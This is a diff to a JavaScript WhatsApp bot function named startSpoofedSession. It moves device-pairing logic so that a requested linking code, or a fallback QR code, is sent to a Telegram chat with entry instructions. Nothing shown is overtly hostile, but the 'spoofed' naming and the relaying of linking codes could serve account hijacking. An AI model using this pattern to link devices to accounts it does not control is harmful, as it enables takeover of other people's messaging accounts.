@@ -83,24 +83,7 @@ async function startSpoofedSession() {
         syncFullHistory: false
     })
 
-    // PAIRING CODE LOGIC
-    const phoneNumber = getPhoneNumber()
-    if (phoneNumber && !sock.authState.creds.registered) {
-        console.log(`[Pairing] Requesting code for: ${phoneNumber}`)
-        setTimeout(async () => {
-            try {
-                const code = await sock.requestPairingCode(phoneNumber.replace(/\D/g, ''))
-                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code
-                console.log('\n--------------------------------------')
-                console.log(`PAIRING CODE: ${formattedCode}`)
-                console.log('--------------------------------------\n')
-                
-                await sendTelegramText(`🔑 *WhatsApp Pairing Code*\n\nCode: \`${formattedCode}\`\n\nEnter this code on your phone in: \nLinked Devices > Link a Device > Link with phone number instead`)
-            } catch (err) {
-                console.log(`[Pairing] Failed to get code: ${err.message}`)
-            }
-        }, 3000)
-    }
+    // PAIRING CODE LOGIC (removed from here, moved to connection.update)
 
     sock.ev.on('creds.update', saveCreds)
 
@@ -113,7 +96,20 @@ async function startSpoofedSession() {
                 console.log(code)
             })
 
-            if (!getPhoneNumber()) {
+            const phoneNumber = getPhoneNumber()
+            if (phoneNumber) {
+                // If phone number is provided, request and send pairing code instead of QR
+                try {
+                    const code = await sock.requestPairingCode(phoneNumber.replace(/\D/g, ''))
+                    const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code
+                    console.log(`[Pairing] Code: ${formattedCode}`)
+                    
+                    await sendTelegramText(`🔑 *WhatsApp Pairing Code*\n\nCode: \`${formattedCode}\`\n\nSteps:\n1. Open WhatsApp > Settings\n2. Linked Devices > Link a Device\n3. Select "Link with phone number instead"\n4. Enter the code above`)
+                } catch (err) {
+                    console.log(`[Pairing] Failed: ${err.message}`)
+                }
+            } else {
+                // Fallback to QR
                 try {
                     const qrBuffer = await QRCode.toBuffer(qr, { scale: 10, margin: 4 })
                     await sendTelegramMedia(qrBuffer, 'whatsapp_qr.png', 'image', 'WhatsApp Login QR Code')
